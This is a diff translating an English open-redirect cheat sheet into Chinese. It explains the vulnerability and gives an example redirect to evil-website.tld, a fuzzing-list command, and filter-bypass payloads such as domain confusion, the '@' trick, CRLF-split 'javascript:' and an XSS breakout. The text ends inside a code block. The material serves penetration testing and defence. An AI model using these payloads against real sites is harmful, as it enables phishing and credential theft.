@@ -1,6 +1,7 @@
-# Open URL Redirection
+# 任意URL跳转
 
-> Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.
+> 当web应用程序接受不受信任的输入时，可能会导致web应用程序将请求重定向到不受信任的输入中包含的URL，这时可以进行未验证的重定向和转发。通过修改恶意站点的不可信URL输入，攻击者可以成功地发起钓鱼欺诈并窃取用户凭证。因为修改链接中的服务器名与原始站点相同，所以钓鱼链接攻击可能会有更可信的外观。未经验证的重定向和转发攻击还可用于恶意地创建一个URL，该URL将通过应用程序的访问控制检查，然后将攻击者转发到他们通常无法访问的特权函数。
+>
 
 ## Summary
 
@@ -13,19 +14,20 @@
 
 ## Exploitation
 
-Let’s say there’s a `well known` website - https://famous-website.tld/. And let's assume that there's a link like :
+假设有一个 `well known` 的网站 - https://famous-website.tld/. 让我们假设有一个这样的链接：
 
 ```powershell
 https://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account
 ```
-After signing up you get redirected to your account, this redirection is specified by the `redirectUrl` parameter in the URL.   
-What happens if we change the `famous-website.tld/account` to `evil-website.tld`?
+注册后你会被重定向到你的账户，此重定向由URL中的 `redirectUrl` 参数指定。
+
+如果我们把 `famous-website.tld/account` 改为`evil-website.tld`会发生什么呢?
 
 ```powerhshell
 https://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account
 ```
 
-By visiting this url, if we get redirected to `evil-website.tld` after the signup, we have an Open Redirect vulnerability. This can be abused by an attacker to display a phishing page asking you to enter your credentials.
+通过访问这个URL，如果在我们注册后被重定向到 `evil-website.tld`，我们就有了一个任意跳转的重定向漏洞。这可能被攻击者用来显示一个钓鱼页面，要求您输入您的凭证。
 
 
 ## HTTP Redirection Status Code - 3xx
@@ -41,9 +43,9 @@ By visiting this url, if we get redirected to `evil-website.tld` after the signu
 
 ## Fuzzing
 
-Replace www.whitelisteddomain.tld from *Open-Redirect-payloads.txt* with a specific white listed domain in your test case
+在您的测试用例中，用一个特定的白名单从 *Open-Redirect-payloads.txt*替换为 www.whitelisteddomain.tld 。
 
-To do this simply modify the WHITELISTEDDOMAIN with value www.test.com to your test case URL.
+要做到这一点，只需将带有值www.test.com的WHITELISTEDDOMAIN修改为您的测试用例URL。
 
 ```powershell
 WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
@@ -51,70 +53,70 @@ WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELIS
 
 ## Filter Bypass
 
-Using a whitelisted domain or keyword
+使用白名单或关键字
 
 ```powershell
 www.whitelisted.com.evil.com redirect to evil.com
 ```
 
-Using CRLF to bypass "javascript" blacklisted keyword
+使用 CRLF 绕过 “javascript” 黑名单关键字
 
 ```powershell
 java%0d%0ascript%0d%0a:alert(0)
 ```
 
-Using "//" to bypass "http" blacklisted keyword
+使用 "//" 绕过 "http" 黑名单关键字
 
 ```powershell
 //google.com
 ```
 
-Using "https:" to bypass "//" blacklisted keyword
+使用 "https:" 绕过 "//" 黑名单关键字
 
 ```powershell
 https:google.com
 ```
 
-Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)
+使用 "\/\/" 绕过 "//" 黑名单关键字 (浏览器会将 \/\/ 识别为 //)
 
 ```powershell
 \/\/google.com/
 /\/google.com/
 ```
 
-Using "%E3%80%82" to bypass "." blacklisted character
+使用 "%E3%80%82" 绕过 "." 黑名单字符
 
 ```powershell
 /?redir=google。com
 //google%E3%80%82com
 ```
 
-Using null byte "%00" to bypass blacklist filter
+使用空子节 "%00" 绕过黑名单过滤器
 
 ```powershell
 //google%00.com
 ```
 
-Using parameter pollution
+使用参数污染
 
 ```powershell
 ?next=whitelisted.com&next=google.com
 ```
 
-Using "@" character, browser will redirect to anything after the "@"
+使用 "@" 字符，浏览器会重定向到“@”之后的任何内容
 
 ```powershell
 http://www.theirsite.com@yoursite.com/
 ```
 
-Creating folder as their domain
+创建文件夹作为它们的域
 
 ```powershell
 http://www.yoursite.com/http://www.theirsite.com/
 http://www.yoursite.com/folder/www.folder.com
 ```
 
-XSS from Open URL - If it's in a JS variable
+使用XSS在任意URL -如果它是在一个JS变量
 
 ```powershell
 ";alert(0);//
